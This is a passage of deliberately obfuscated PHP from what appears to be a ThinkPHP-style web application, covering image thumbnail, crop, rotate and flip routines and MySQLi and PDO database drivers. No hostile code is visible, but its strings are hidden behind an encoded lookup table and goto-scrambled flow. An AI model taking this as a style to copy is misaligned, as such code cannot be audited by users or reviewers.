Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÍÓÖ€°å][519])) { self::$handle->clearTimeout(); } } } goto F æ½‡ŒÓ¿; F‹Õ£°¯‰à: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($D™÷”•‚‡, $B“ã¥¹×ô ) { goto böàîŞÎÎÎ; fàÊ¸½‹Ôä: if (!$this->im) { return !1; } $dµºœ¢ÉÅ– = $_SERVER[ÍÓÖ€°å][33]; $this->imgData = GetImageSize($D™÷”•‚‡, $dµºœ¢ÉÅ–); goto E°Ö×ñÇÓÑ; böàîŞÎÎÎ: $this->srcFile = $D™÷”•‚‡; $this->echoType = $B“ã¥¹×ô ; $this->im = self::image($D™÷”•‚‡); goto fàÊ¸½‹Ôä; E°Ö×ñÇÓÑ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto b¡è„ª¾²Ê; b¡è„ª¾²Ê: } public static function image($f± œ¤Êç“) { $FòÆĞ—‡ùÙ =& $_SERVER[ÍÓÖ€°å]; $FÕÃ‡«İ»ç = $FòÆĞ—‡ùÙ[33]; $F‚­ñÂ‡Ñˆ = GetImageSize($f± œ¤Êç“, $FÕÃ‡«İ»ç); $DÈëØƒêÆ = !1; switch ($F‚­ñÂ‡Ñˆ[2]) { case IMAGETYPE_GIF: if (!function_exists($FòÆĞ—‡ùÙ[1227])) { break; } $DÈëØƒêÆ = imagecreatefromgif($f± œ¤Êç“); break; case IMAGETYPE_JPEG: if (!function_exists($FòÆĞ—‡ùÙ[1228])) { break; } $DÈëØƒêÆ = imagecreatefromjpeg($f± œ¤Êç“); break; case IMAGETYPE_PNG: if (!function_exists($FòÆĞ—‡ùÙ[1229])) { break; } $DÈëØƒêÆ = @imagecreatefrompng($f± œ¤Êç“); imagesavealpha($DÈëØƒêÆ, !0); break; case IMAGETYPE_XBM: $DÈëØƒêÆ = imagecreatefromxbm($f± œ¤Êç“); break; case IMAGETYPE_WBMP: $DÈëØƒêÆ = imagecreatefromwbmp($f± œ¤Êç“); break; case IMAGETYPE_BMP: $DÈëØƒêÆ = imagecreatefrombmp($f± œ¤Êç“); break; default: break; } return $DÈëØƒêÆ; } public static function imageSize($cîË”¢…) { $Fô®È©é°Ñ =& $_SERVER[ÍÓÖ€°å]; $B×È¨âùÎÖ = GetImageSize($cîË”¢…); if (!$B×È¨âùÎÖ) { return !1; } return array($Fô®È©é°Ñ[201] => $B×È¨âùÎÖ[0], $Fô®È©é°Ñ[868] => $B×È¨âùÎÖ[1]); } function distortion($C¢¿áİî›‚, $bˆœ»¤½™, $E¨§ƒÏ‹İ‘) { $f²ÇÛ´‚ = $this->creatImage($this->im, $bˆœ»¤½™, $E¨§ƒÏ‹İ‘, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($f²ÇÛ´‚, $C¢¿áİî›‚); } function prorate($AÅ®¼¯³ß’, $eŠÙ·œöˆ, $eŠÆ™‰Şèà) { $E–éÁ¶‘¡¯ = $eŠÙ·œöˆ / $eŠÆ™‰Şèà; $Aƒ¹˜¹ğ¯° = $this->srcW / $this->srcH; if ($E–éÁ¶‘¡¯ <= $Aƒ¹˜¹ğ¯°) { $bƒ¬ãŒÅß¶ = $eŠÙ·œöˆ; $e¬Ú÷“ŒÑÎ = $bƒ¬ãŒÅß¶ * ($this->srcH / $this->srcW); } else { $e¬Ú÷“ŒÑÎ = $eŠÆ™‰Şèà; $bƒ¬ãŒÅß¶ = $e¬Ú÷“ŒÑÎ * ($this->srcW / $this->srcH); } if ($this->srcW > $eŠÙ·œöˆ || $this->srcH > $eŠÆ™‰Şèà) { $a¿è”ïìø = $this->creatImage($this->im, $bƒ¬ãŒÅß¶, $e¬Ú÷“ŒÑÎ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($a¿è”ïìø, $AÅ®¼¯³ß’); } else { $a¿è”ïìø = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($a¿è”ïìø, $AÅ®¼¯³ß’); } } function cut($bã²†ì²Èã, $BÃæîÇ³ï, $fŠ’Æâ®‚®) { goto F¼’Ÿ¿±“; AíÌõøçÔÈ: return $this->echoImage($e¹ØÎ•Ò¡, $bã²†ì²Èã); goto BŒÕ÷ªÒç½; F¼’Ÿ¿±“: $f‘Ÿò«Ïñá = $BÃæîÇ³ï / $fŠ’Æâ®‚®; $a«ù¢ª‘£î = $this->srcW / $this->srcH; if ($f‘Ÿò«Ïñá <= $a«ù¢ª‘£î) { $CÒáòÎø † = $fŠ’Æâ®‚®; $e«¸ÁÔÜ¶— = $CÒáòÎø † * ($this->srcW / $this->srcH); } else { $e«¸ÁÔÜ¶— = $BÃæîÇ³ï; $CÒáòÎø † = $e«¸ÁÔÜ¶— * ($this->srcH / $this->srcW); } goto c°  ù›Ìè; c°  ù›Ìè: $DĞÀ›˜àî¦ = $this->creatImage($this->im, $e«¸ÁÔÜ¶—, $CÒáòÎø †, 0, 0, 0, 0, $this->srcW, $this->srcH); $e¹ØÎ•Ò¡ = $this->creatImage($DĞÀ›˜àî¦, $BÃæîÇ³ï, $fŠ’Æâ®‚®, 0, 0, ($e«¸ÁÔÜ¶— - $BÃæîÇ³ï) / 2, ($CÒáòÎø † - $fŠ’Æâ®‚®) / 2, $BÃæîÇ³ï, $fŠ’Æâ®‚®); imageDestroy($DĞÀ›˜àî¦); goto AíÌõøçÔÈ; BŒÕ÷ªÒç½: } function backFill($aİ¬‡Ğíá¶, $b‘¦á•ŞÒô, $Aª÷È´¼â, $f©¸Ù´šìµ = false, $b…„ì´ÖÍÌ = 255, $D„ÈÊ‹‰® = 255, $b•¼”ò¸ = 255) { goto Aµ›Ø®¿Î; b‹ÁµÛ´ÏŠ: return $this->echoImage($BÔ†ëŠ÷‡, $aİ¬‡Ğíá¶); goto EêÑ²ØÚÌŒ; a‡Óôõµ™: if ($f©¸Ù´šìµ) { $e§ô…ĞÊÚÇ = imageColorTransparent($BÔ†ëŠ÷‡, $e§ô…ĞÊÚÇ); $FèÀÒœè¤ = $Aª÷È´¼â - $AĞ¥ñóÙôÄ; } imageFilledRectangle($BÔ†ëŠ÷‡, 0, 0, $b‘¦á•ŞÒô, $Aª÷È´¼â, $e§ô…ĞÊÚÇ); if ($this->srcW > $b‘¦á•ŞÒô || $this->srcH > $Aª÷È´¼â) { $E§°‚™Ò¶­ = $this->creatImage($this->im, $BÒê¦·Òùö, $AĞ¥ñóÙôÄ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($BÒê¦·Òùö < $b‘¦á•ŞÒô) { imageCopy($BÔ†ëŠ÷‡, $E§°‚™Ò¶­, ($b‘¦á•ŞÒô - $BÒê¦·Òùö) / 2, 0, 0, 0, $BÒê¦·Òùö, $AĞ¥ñóÙôÄ); } else { if ($AĞ¥ñóÙôÄ < $Aª÷È´¼â) { imageCopy($BÔ†ëŠ÷‡, $E§°‚™Ò¶­, 0, $FèÀÒœè¤, 0, 0, $BÒê¦·Òùö, $AĞ¥ñóÙôÄ); } else { imageCopy($BÔ†ëŠ÷‡, $E§°‚™Ò¶­, 0, 0, 0, 0, $BÒê¦·Òùö, $AĞ¥ñóÙôÄ); } } } else { imageCopyMerge($BÔ†ëŠ÷‡, $this->im, ($b‘¦á•ŞÒô - $BÒê¦·Òùö) / 2, $FèÀÒœè¤, 0, 0, $BÒê¦·Òùö, $AĞ¥ñóÙôÄ, 100); } goto b‹ÁµÛ´ÏŠ; Aµ›Ø®¿Î: $dÈß¸Ö§¢ = $b‘¦á•ŞÒô / $Aª÷È´¼â; $C¬æ§…×¶Õ = $this->srcW / $this->srcH; if ($dÈß¸Ö§¢ <= $C¬æ§…×¶Õ) { $BÒê¦·Òùö = $b‘¦á•ŞÒô; $AĞ¥ñóÙôÄ = $BÒê¦·Òùö * ($this->srcH / $this->srcW); } else { $AĞ¥ñóÙôÄ = $Aª÷È´¼â; $BÒê¦·Òùö = $AĞ¥ñóÙôÄ * ($this->srcW / $this->srcH); } goto b¾°ƒ‡äİ; b¾°ƒ‡äİ: if (function_exists($_SERVER[ÍÓÖ€°å][1230])) { @($BÔ†ëŠ÷‡ = imageCreateTrueColor($b‘¦á•ŞÒô, $Aª÷È´¼â)); if (!$BÔ†ëŠ÷‡) { $BÔ†ëŠ÷‡ = imageCreate($b‘¦á•ŞÒô, $Aª÷È´¼â); } } else { $BÔ†ëŠ÷‡ = imageCreate($b‘¦á•ŞÒô, $Aª÷È´¼â); } $FèÀÒœè¤ = ($Aª÷È´¼â - $AĞ¥ñóÙôÄ) / 2; $e§ô…ĞÊÚÇ = imagecolorallocate($BÔ†ëŠ÷‡, $b…„ì´ÖÍÌ, $D„ÈÊ‹‰®, $b•¼”ò¸); goto a‡Óôõµ™; EêÑ²ØÚÌŒ: } function creatImage($Dº¦ÇÂ°µ…, $Eèé¡¦Ş Ô, $f„äÇò Š©, $CÌ¥”œÇ£, $b£¡×¼ëŞ±, $Cì“¶»±ƒ±, $C¯š²¾¶Õç, $EÁ²ÔËæä¼, $DÍß‘«˜È£) { if (function_exists($_SERVER[ÍÓÖ€°å][1230])) { @($CğĞ¸Á®»æ = ImageCreateTrueColor($Eèé¡¦Ş Ô, $f„äÇò Š©)); @imagealphablending($CğĞ¸Á®»æ, !1); @imagesavealpha($CğĞ¸Á®»æ, !0); if ($CğĞ¸Á®»æ) { imageCopyResampled($CğĞ¸Á®»æ, $Dº¦ÇÂ°µ…, $CÌ¥”œÇ£, $b£¡×¼ëŞ±, $Cì“¶»±ƒ±, $C¯š²¾¶Õç, $Eèé¡¦Ş Ô, $f„äÇò Š©, $EÁ²ÔËæä¼, $DÍß‘«˜È£); } else { $CğĞ¸Á®»æ = ImageCreate($Eèé¡¦Ş Ô, $f„äÇò Š©); imageCopyResized($CğĞ¸Á®»æ, $Dº¦ÇÂ°µ…, $CÌ¥”œÇ£, $b£¡×¼ëŞ±, $Cì“¶»±ƒ±, $C¯š²¾¶Õç, $Eèé¡¦Ş Ô, $f„äÇò Š©, $EÁ²ÔËæä¼, $DÍß‘«˜È£); } } else { $CğĞ¸Á®»æ = ImageCreate($Eèé¡¦Ş Ô, $f„äÇò Š©); imageCopyResized($CğĞ¸Á®»æ, $Dº¦ÇÂ°µ…, $CÌ¥”œÇ£, $b£¡×¼ëŞ±, $Cì“¶»±ƒ±, $C¯š²¾¶Õç, $Eèé¡¦Ş Ô, $f„äÇò Š©, $EÁ²ÔËæä¼, $DÍß‘«˜È£); } return $CğĞ¸Á®»æ; } public function imgRotate($eè¤†¥ ¹Á, $B”¸ÔÎí´Æ) { goto FÌÜí’ÏÊâ; fé½¯ğÏø: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $d ¾ÆºÄÁ¢ = imagegif($CåïÄ×´ù, $eè¤†¥ ¹Á); break; case IMAGETYPE_JPEG: $d ¾ÆºÄÁ¢ = imagejpeg($CåïÄ×´ù, $eè¤†¥ ¹Á, 100); break; case IMAGETYPE_PNG: $d ¾ÆºÄÁ¢ = imagePNG($CåïÄ×´ù, $eè¤†¥ ¹Á); break; default: break; } imageDestroy($CåïÄ×´ù); imageDestroy($this->im); goto B“éË‰ùÄƒ; FÌÜí’ÏÊâ: if (!$this->im || $B”¸ÔÎí´Æ % 360 === 0 || !function_exists($_SERVER[ÍÓÖ€°å][1231])) { return !1; } $CåïÄ×´ù = imageRotate($this->im, 360 - $B”¸ÔÎí´Æ, 0); $d ¾ÆºÄÁ¢ = !1; goto fé½¯ğÏø; B“éË‰ùÄƒ: return $d ¾ÆºÄÁ¢; goto f÷í‘ÌØ¹; f÷í‘ÌØ¹: } function echoImage($fâªÑ’³Ÿ, $b‚ö®Úóæ) { goto D¶ÓÃëô¹; AŸ¸†« : $F•Œ†«‚Š = !1; switch ($this->echoType) { case $b¶ÕëÛæ‰¬[1232]: $F•Œ†«‚Š = imagePNG($fâªÑ’³Ÿ); break; case $b¶ÕëÛæ‰¬[155]: $F•Œ†«‚Š = imagePNG($fâªÑ’³Ÿ, $b‚ö®Úóæ); break; } imageDestroy($fâªÑ’³Ÿ); goto dìÀ«Ê’“¹; dìÀ«Ê’“¹: imageDestroy($this->im); return $F•Œ†«‚Š; goto A§»–»œ»; D¶ÓÃëô¹: $b¶ÕëÛæ‰¬ =& $_SERVER[ÍÓÖ€°å]; if (!$fâªÑ’³Ÿ) { return !1; } ob_get_clean(); goto AŸ¸†« ; A§»–»œ»: } } if (!function_exists($_SERVER[ÍÓÖ€°å][1233])) { define($_SERVER[ÍÓÖ€°å][1234], 0); define($_SERVER[ÍÓÖ€°å][1235], 1); define($_SERVER[ÍÓÖ€°å][1236], 2); function imageflip($aøƒ¤Ê§‰ö, $B„­Ô¤ê‚›) { switch ($B„­Ô¤ê‚›) { case IMG_FLIP_HORIZONTAL: $bÅ¨ŸÃ·î­ = imagesx($aøƒ¤Ê§‰ö) - 1; $B†¥îá÷›˜ = $bÅ¨ŸÃ·î­ / 2; $F‹Å»å‹–Ã = imagesy($aøƒ¤Ê§‰ö); $Fö™Æ››÷Á = imageistruecolor($aøƒ¤Ê§‰ö) ? imagecreatetruecolor(1, $F‹Å»å‹–Ã) : imagecreate(1, $F‹Å»å‹–Ã); for ($C¢¨¿•‡­Æ = 0; $C¢¨¿•‡­Æ < $B†¥îá÷›˜; ++$C¢¨¿•‡­Æ) { imagecopy($Fö™Æ››÷Á, $aøƒ¤Ê§‰ö, 0, 0, $C¢¨¿•‡­Æ, 0, 1, $F‹Å»å‹–Ã); imagecopy($aøƒ¤Ê§‰ö, $aøƒ¤Ê§‰ö, $C¢¨¿•‡­Æ, 0, $bÅ¨ŸÃ·î­ - $C¢¨¿•‡­Æ, 0, 1, $F‹Å»å‹–Ã); imagecopy($aøƒ¤Ê§‰ö, $Fö™Æ››÷Á, $bÅ¨ŸÃ·î­ - $C¢¨¿•‡­Æ, 0, 0, 0, 1, $F‹Å»å‹–Ã); } break; case IMG_FLIP_VERTICAL: $fé‡´Ï‚ = imagesx($aøƒ¤Ê§‰ö); $eºÚõ‚‘¸† = imagesy($aøƒ¤Ê§‰ö) - 1; $a´¸‹Ó†âÑ = $eºÚõ‚‘¸† / 2; $Fö™Æ››÷Á = imageistruecolor($aøƒ¤Ê§‰ö) ? imagecreatetruecolor($fé‡´Ï‚, 1) : imagecreate($fé‡´Ï‚, 1); for ($eÌÃÁÙíĞ˜ = 0; $eÌÃÁÙíĞ˜ < $a´¸‹Ó†âÑ; ++$eÌÃÁÙíĞ˜) { imagecopy($Fö™Æ››÷Á, $aøƒ¤Ê§‰ö, 0, 0, 0, $eÌÃÁÙíĞ˜, $fé‡´Ï‚, 1); imagecopy($aøƒ¤Ê§‰ö, $aøƒ¤Ê§‰ö, 0, $eÌÃÁÙíĞ˜, 0, $eºÚõ‚‘¸† - $eÌÃÁÙíĞ˜, $fé‡´Ï‚, 1); imagecopy($aøƒ¤Ê§‰ö, $Fö™Æ››÷Á, 0, $eºÚõ‚‘¸† - $eÌÃÁÙíĞ˜, 0, 0, $fé‡´Ï‚, 1); } break; case IMG_FLIP_BOTH: $fé‡´Ï‚ = imagesx($aøƒ¤Ê§‰ö); $F‹Å»å‹–Ã = imagesy($aøƒ¤Ê§‰ö); $Fö™Æ››÷Á = imagerotate($aøƒ¤Ê§‰ö, 180, 0); imagecopy($aøƒ¤Ê§‰ö, $Fö™Æ››÷Á, 0, 0, 0, 0, $fé‡´Ï‚, $F‹Å»å‹–Ã); break; default: return; } imagedestroy($Fö™Æ››÷Á); } } if (!function_exists($_SERVER[ÍÓÖ€°å][1237])) { function imagecreatefrombmp($F¼šïÌÁ¾ ) { return imageGdBMP::load($F¼šïÌÁ¾ ); } } goto bñ¿ÛÆ•; aËÊÇó¶á: class DbMysqli extends Db { public function __construct($BÀŒ®×Æ–© = '') { $D¡Àõ…°åŞ =& $_SERVER[ÍÓÖ€°å]; if (!extension_loaded($D¡Àõ…°åŞ[579])) { think_exception(think_lang($D¡Àõ…°åŞ[10]) . $D¡Àõ…°åŞ[580]); } if (!empty($BÀŒ®×Æ–©)) { $this->config = $BÀŒ®×Æ–©; if (empty($this->config[$D¡Àõ…°åŞ[13]])) { $this->config[$D¡Àõ…°åŞ[13]] = $D¡Àõ…°åŞ[33]; } } } public function connect($DíÕõãÇÑä = '', $BŠĞ çÒ¡ = 0) { $CÁÀ¨Õš„¨ =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->linkID[$BŠĞ çÒ¡])) { goto cˆê¼Ä»ó…; cˆê¼Ä»ó…: if (empty($DíÕõãÇÑä)) { $DíÕõãÇÑä = $this->config; } $this->linkID[$BŠĞ çÒ¡] = new mysqli($DíÕõãÇÑä[$CÁÀ¨Õš„¨[553]], $DíÕõãÇÑä[$CÁÀ¨Õš„¨[555]], $DíÕõãÇÑä[$CÁÀ¨Õš„¨[556]], $DíÕõãÇÑä[$CÁÀ¨Õš„¨[17]], $DíÕõãÇÑä[$CÁÀ¨Õš„¨[554]] ? intval($DíÕõãÇÑä[$CÁÀ¨Õš„¨[554]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EôàÄ°«±Š; EôàÄ°«±Š: $A®«ÏÉšÔ = $this->linkID[$BŠĞ çÒ¡]->server_version; $this->linkID[$BŠĞ çÒ¡]->query($CÁÀ¨Õš„¨[557] . think_config($CÁÀ¨Õš„¨[558]) . $CÁÀ¨Õš„¨[55]); if ($A®«ÏÉšÔ > $CÁÀ¨Õš„¨[559]) { $this->linkID[$BŠĞ çÒ¡]->query($CÁÀ¨Õš„¨[560]); } goto aÊâ³ ”‡Ñ; aÊâ³ ”‡Ñ: $this->connected = !0; if (1 != think_config($CÁÀ¨Õš„¨[18])) { unset($this->config); } goto bô“çêøÇ¸; bô“çêøÇ¸: } return $this->linkID[$BŠĞ çÒ¡]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($eœĞÓ¶“Ö´) { goto eóª³±·ó; eóª³±·ó: $eö¯ª’«éÏ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d¦ä’±Ü; fœÅÎÕçâ£: think_status($eö¯ª’«éÏ[20]); $this->queryID = $this->_linkID->query($eœĞÓ¶“Ö´); if ($this->_linkID->more_results()) { while (($fº´«ˆÃíö = $this->_linkID->next_result()) != NULL) { $fº´«ˆÃíö->free_result(); } } goto c£ÀùÓóÎÒ; d¦ä’±Ü: $this->queryStr = $eœĞÓ¶“Ö´; if ($this->queryID) { $this->free(); } think_action_status($eö¯ª’«éÏ[19], 1); goto fœÅÎÕçâ£; c£ÀùÓóÎÒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto AƒøÓï”ƒÍ; AƒøÓï”ƒÍ: } public function execute($fÆ¤»·œ±) { goto DÍö´©Úœ„; BÖ…ƒ†Šè¸: $this->queryStr = $fÆ¤»·œ±; if ($this->queryID) { $this->free(); } think_action_status($dÄ©Šé£‡ä[21], 1); goto f¨ò¡‘‹á“; f¨ò¡‘‹á“: think_status($dÄ©Šé£‡ä[20]); $C‹¨–¥ö¾ = $this->_linkID->query($fÆ¤»·œ±); $this->debug(); goto bİÂ±áßÉ; bİÂ±áßÉ: if (!1 === $C‹¨–¥ö¾) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eŒè±¬Îí×; DÍö´©Úœ„: $dÄ©Šé£‡ä =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÖ…ƒ†Šè¸; eŒè±¬Îí×: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C÷¡Ò×¯‰ç = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$C÷¡Ò×¯‰ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÇ¼¿¬¥«‹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÇ¼¿¬¥«‹) { $this->error(); return !1; } } return !0; } private function getAll() { $AİÜ—¿³¬ô = array(); if ($this->numRows > 0) { for ($cáğ¨ÎœÁ = 0; $cáğ¨ÎœÁ < $this->numRows; $cáğ¨ÎœÁ++) { $AİÜ—¿³¬ô[$cáğ¨ÎœÁ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $AİÜ—¿³¬ô; } public function getFields($aäîëù ŠĞ) { $f´õíŸÇù =& $_SERVER[ÍÓÖ€°å]; $Fíò†î¢„ = $this->query($f´õíŸÇù[564] . $this->parseKey($aäîëù ŠĞ)); $Fˆ¼‰”•« = array(); if ($Fíò†î¢„) { foreach ($Fíò†î¢„ as $C¥›½ˆááë => $F¬¸²¯Ó˜†) { $Fˆ¼‰”•«[$F¬¸²¯Ó˜†[$f´õíŸÇù[27]]] = array($f´õíŸÇù[28] => $F¬¸²¯Ó˜†[$f´õíŸÇù[27]], $f´õíŸÇù[29] => $F¬¸²¯Ó˜†[$f´õíŸÇù[30]], $f´õíŸÇù[31] => (bool) ($F¬¸²¯Ó˜†[$f´õíŸÇù[32]] === $f´õíŸÇù[33]), $f´õíŸÇù[34] => $F¬¸²¯Ó˜†[$f´õíŸÇù[35]], $f´õíŸÇù[36] => strtolower($F¬¸²¯Ó˜†[$f´õíŸÇù[37]]) == $f´õíŸÇù[38], $f´õíŸÇù[39] => strtolower($F¬¸²¯Ó˜†[$f´õíŸÇù[40]]) == $f´õíŸÇù[41]); } } return $Fˆ¼‰”•«; } public function getTables($fÏ…·Ë½Ù = '') { $eÌ¡ãÖÉĞÅ =& $_SERVER[ÍÓÖ€°å]; $aõÈŠ›ØÆ = !empty($fÏ…·Ë½Ù) ? $eÌ¡ãÖÉĞÅ[566] . $fÏ…·Ë½Ù : $eÌ¡ãÖÉĞÅ[567]; $B‚õ¼«Ìù¶ = $this->query($aõÈŠ›ØÆ); $BµËŒñ¦×À = array(); if ($B‚õ¼«Ìù¶) { foreach ($B‚õ¼«Ìù¶ as $cø«ïêÔ•Å => $C‘ŒÕ›•‡) { $BµËŒñ¦×À[$cø«ïêÔ•Å] = current($C‘ŒÕ›•‡); } } return $BµËŒñ¦×À; } public function replace($f«ÄÔ×ÏÈ, $c‘ñíĞÆ©ù = array()) { $eÛ£•ÔÚğ =& $_SERVER[ÍÓÖ€°å]; foreach ($f«ÄÔ×ÏÈ as $D½ÕÅÔ°¹Œ => $BµëÁª©ñ¡) { $C‰ğ—²çÂ = $this->parseValue($BµëÁª©ñ¡); if (is_scalar($C‰ğ—²çÂ)) { $cÜó”»©ëõ[] = $C‰ğ—²çÂ; $bÆŠĞ›¸ä‘[] = $this->parseKey($D½ÕÅÔ°¹Œ); } } $EÀÓà ÊÇË = $eÛ£•ÔÚğ[568] . $this->parseTable($c‘ñíĞÆ©ù[$eÛ£•ÔÚğ[259]]) . $eÛ£•ÔÚğ[569] . implode($eÛ£•ÔÚğ[47], $bÆŠĞ›¸ä‘) . $eÛ£•ÔÚğ[570] . implode($eÛ£•ÔÚğ[47], $cÜó”»©ëõ) . $eÛ£•ÔÚğ[571]; return $this->execute($EÀÓà ÊÇË); } public function insertAll($cÀ‹¸©é½×, $EÖ¾ÎÁÀä× = array(), $fÁ‹ìªƒÁ¤ = false) { goto Eµ‘‹“´¢™; Eµ‘‹“´¢™: $eßæôÑÍ‹× =& $_SERVER[ÍÓÖ€°å]; if (!is_array($cÀ‹¸©é½×[0])) { return !1; } $døó†Ø…†Ã = array_keys($cÀ‹¸©é½×[0]); goto Fß×ºöÔÜÑ; bè¶î»È¿Ú: $fµ˜çÌÍ‹‰ = ($fÁ‹ìªƒÁ¤ ? $eßæôÑÍ‹×[573] : $eßæôÑÍ‹×[574]) . $eßæôÑÍ‹×[575] . $this->parseTable($EÖ¾ÎÁÀä×[$eßæôÑÍ‹×[259]]) . $eßæôÑÍ‹×[569] . implode($eßæôÑÍ‹×[47], $døó†Ø…†Ã) . $eßæôÑÍ‹×[576] . implode($eßæôÑÍ‹×[47], $A™­†’„Ø›); return $this->execute($fµ˜çÌÍ‹‰); goto F‡ÉÇİÄ­Ä; Fß×ºöÔÜÑ: $A™­†’„Ø› = array(); foreach ($cÀ‹¸©é½× as $C…Àğ­Õ­î) { $B¬˜šŒ² Í = array(); foreach ($C…Àğ­Õ­î as $A›áªöÀ¸§ => $F¬°ˆ‰êâî) { $F¬°ˆ‰êâî = $this->parseValue($F¬°ˆ‰êâî); if (is_scalar($F¬°ˆ‰êâî)) { $B¬˜šŒ² Í[] = $F¬°ˆ‰êâî; } } $A™­†’„Ø›[] = $eßæôÑÍ‹×[240] . implode($eßæôÑÍ‹×[47], $B¬˜šŒ² Í) . $eßæôÑÍ‹×[571]; } array_walk($døó†Ø…†Ã, array($this, $eßæôÑÍ‹×[572])); goto bè¶î»È¿Ú; F‡ÉÇİÄ­Ä: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e…½…±¦Ô =& $_SERVER[ÍÓÖ€°å]; $this->error = $this->_linkID->errno . $e…½…±¦Ô[4] . $this->_linkID->error; if ($e…½…±¦Ô[33] != $this->queryStr) { $this->error .= LNG($e…½…±¦Ô[45]) . $this->queryStr; } think_trace($this->error, $e…½…±¦Ô[33], $e…½…±¦Ô[46]); return $this->error; } public function escapeString($dÀŞøòà¥) { if ($this->_linkID) { return $this->_linkID->real_escape_string($dÀŞøòà¥); } else { return addslashes($dÀŞøòà¥); } } public function parseKey(&$B–²ğšó‹, $bÑ×®ØñŠ = true) { $BÌİğ”ˆ‰º =& $_SERVER[ÍÓÖ€°å]; if ($bÑ×®ØñŠ) { $B–²ğšó‹ = $this->parseKeyCheck($B–²ğšó‹); } if ($B–²ğšó‹ != $BÌİğ”ˆ‰º[164] && !preg_match($BÌİğ”ˆ‰º[577], $B–²ğšó‹)) { $B–²ğšó‹ = $BÌİğ”ˆ‰º[578] . trim($B–²ğšó‹, $BÌİğ”ˆ‰º[578]) . $BÌİğ”ˆ‰º[578]; } return $B–²ğšó‹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d‹±‚Ú‹¥É = '') { $B˜§Ò‘†Ã =& $_SERVER[ÍÓÖ€°å]; if (!class_exists($B˜§Ò‘†Ã[581])) { think_exception(think_lang($B˜§Ò‘†Ã[10]) . $B˜§Ò‘†Ã[582]); } if (!empty($d‹±‚Ú‹¥É)) { $this->config = $d‹±‚Ú‹¥É; if (empty($this->config[$B˜§Ò‘†Ã[13]])) { $this->config[$B˜§Ò‘†Ã[13]] = array(); } } } public function connect($aìÖç—ÕôĞ = '', $béîÆÄ—Û = 0) { $d‚…î¾îæ =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->linkID[$béîÆÄ—Û])) { goto f¹çÕä‘¡ê; f¹çÕä‘¡ê: if (empty($aìÖç—ÕôĞ)) { $aìÖç—ÕôĞ = $this->config; } if ($this->pconnect) { $aìÖç—ÕôĞ[$d‚…î¾îæ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$béîÆÄ—Û] = new PDO($aìÖç—ÕôĞ[$d‚…î¾îæ[583]], $aìÖç—ÕôĞ[$d‚…î¾îæ[555]], $aìÖç—ÕôĞ[$d‚…î¾îæ[556]], $aìÖç—ÕôĞ[$d‚…î¾îæ[13]]); } catch (PDOException $eÊŒ§¼Ü£) { think_exception($eÊŒ§¼Ü£->getMessage()); } goto CÒ›¾Ş¤÷¨; e¸ô…¹Ú×£: $this->linkID[$béîÆÄ—Û]->exec($d‚…î¾îæ[592] . think_config($d‚…î¾îæ[558])); $this->connected = !0; if (1 != think_config($d‚…î¾îæ[18])) { unset($this->config); } goto d÷íç®ê£í; CÒ›¾Ş¤÷¨: $this->dbType = $this->_getDsnType($aìÖç—ÕôĞ[$d‚…î¾îæ[583]]); if (in_array($this->dbType, array($d‚…î¾îæ[584], $d‚…î¾îæ[585], $d‚…î¾îæ[586], $d‚…î¾îæ[587]))) { think_exception($d‚…î¾îæ[588] . $this->dbType . $d‚…î¾îæ[589] . $this->dbType . $d‚…î¾îæ[590]); } if (!$this->linkID[$béîÆÄ—Û]) { think_exception($d‚…î¾îæ[591]); } goto e¸ô…¹Ú×£; d÷íç®ê£í: } return $this->linkID[$béîÆÄ—Û]; } public function free() { $this->PDOStatement = null; } public function query($f‹•Ÿ²œƒë, $D™à¥¯ğ±² = array()) { goto f‘Â™Ÿ¥º¹; f‘Â™Ÿ¥º¹: $AèÉº´« =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÂïÖ ãƒ£; c³­óßœå¢: think_action_status($AèÉº´«[19], 1); think_status($AèÉº´«[20]); $this->PDOStatement = $this->_linkID->prepare($f‹•Ÿ²œƒë); goto A×šÏ¬ì©; bÂïÖ ãƒ£: $this->queryStr = $f‹•Ÿ²œƒë; if (!empty($D™à¥¯ğ±²)) { $this->queryStr .= $AèÉº´«[593] . print_r($D™à¥¯ğ±², !0) . $AèÉº´«[594]; } if (!empty($this->PDOStatement)) { $this->free(); } goto c³­óßœå¢; A×šÏ¬ì©: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $DœòºÊ¿ = $this->PDOStatement->execute($D™à¥¯ğ±²); $this->debug(); goto AáßÍÓ§è; 